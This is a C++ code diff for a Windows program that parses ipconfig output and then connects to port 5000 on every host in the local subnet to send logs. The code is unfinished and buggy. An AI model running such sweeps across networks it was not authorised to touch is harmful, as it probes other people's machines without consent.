@@ -60,9 +60,11 @@ string get_ip_from_decimal(unsigned long ip) {
     return result;
 }
 
-SOCKET sock_arr [254];
+// SOCKET sock_arr [254];
+// fd_set write_fds;
+// fd_set write_fds[256][256];
 
-void send_file(SOCKET ** ret_val) {
+void send_file(fd_set **write_fds, SOCKET ** sock_arr) {
 
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
@@ -80,55 +82,68 @@ void send_file(SOCKET ** ret_val) {
 
     sscanf(ipInfo[0].c_str(), "%d.%d.%d.%d", &c, &d, &e, &f);
 
-    unsigned long ip = f + e*256 + d*256*256 + c*256*256*256;
+    // unsigned long ip = f + e*256 + d*256*256 + c*256*256*256;
 
-    sscanf(ipInfo[1].c_str(), "%d.%d.%d.%d", &c, &d, &e, &f);
+    int s_c, s_d, s_e, s_f;
 
-    unsigned long subnet_mask = f + e*256 + d*256*256 + c*256*256*256;
+    sscanf(ipInfo[1].c_str(), "%d.%d.%d.%d", &s_c, &s_d, &s_e, &s_f);
 
-    unsigned long network_address = ip & subnet_mask;
+    // unsigned long subnet_mask = f + e*256 + d*256*256 + c*256*256*256;
+
+    // unsigned long network_address = ip & subnet_mask;
+
+    int n_c, n_d, n_e, n_f;
+
+    n_c = s_c & c;
+    n_d = s_d & d;
+    n_e = s_e & e;
+    n_f = s_f & f;
 
     // 33 = 00000000 00000000 00000000 00100001
 
     int select_result = 0;
     SOCKET * sock;
 
-    fd_set write_fds;
-    FD_ZERO(&write_fds);
+    // fd_set write_fds[254];
+    // fd_set write_fds;
 
-    for (int i = 0; i < 254; i++) {
-        sockaddr_in addr;
+    // FD_ZERO(&write_fds);
 
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = inet_addr(get_ip_from_decimal(network_address).c_str());
-        addr.sin_port = htons(5000);
+    LogSender ls;
 
-        LogSender l(&addr);
-        // threads[i] = thread(send_log, l, filename);
+    for (int i = n_e; i <= n_e + (256 - s_e - 1); i++) {
+        cout << i << endl;
 
-        sock_arr[i] = l.send_logs();;
+        for (int j = n_f; j < 256; j++) {
+            FD_ZERO(&(write_fds)[i][j]);
 
-        FD_SET(sock_arr[i], &write_fds);
+            sockaddr_in addr;
 
-        network_address += 1;
+            char ip_address[20];
+            sprintf(ip_address, "%d.%d.%d.%d", n_c, n_d, i, j);
+
+            addr.sin_family = AF_INET;
+            addr.sin_addr.s_addr = inet_addr((const char *)ip_address);
+            // cout << get_ip_from_decimal(network_address).c_str() << endl;
+
+            // addr.sin_addr.s_addr = inet_addr("131.155.222.2");
+            addr.sin_port = htons(5000);
+
+            (sock_arr)[i][j] = ls.send_logs(&addr);
+
+            FD_SET((sock_arr)[i][j], &(write_fds)[i][j]);
+            // FD_SET((*sock_arr)[i], &write_fds);
+
+            // network_address += 1;
+       }
     }
 
-    timeval timeout;
+    // timeval timeout;
 
-    timeout.tv_sec = 2;
-    timeout.tv_usec = 0;
+    // timeout.tv_sec = 10;
+    // timeout.tv_usec = 0;
 
-    select(0, NULL, &write_fds, NULL, &timeout);
+    // select(254, NULL, &write_fds, NULL, &timeout);
 
-    bool finish = false;
-
-    while (!finish) {
-        for (int i = 0; i < 254; i++) {
-            if (FD_ISSET(sock_arr[i], &write_fds)) {
-                *ret_val = &sock_arr[i];
-
-                finish = true;
-            }
-        }
-    }
+    // return write_fds;
 }
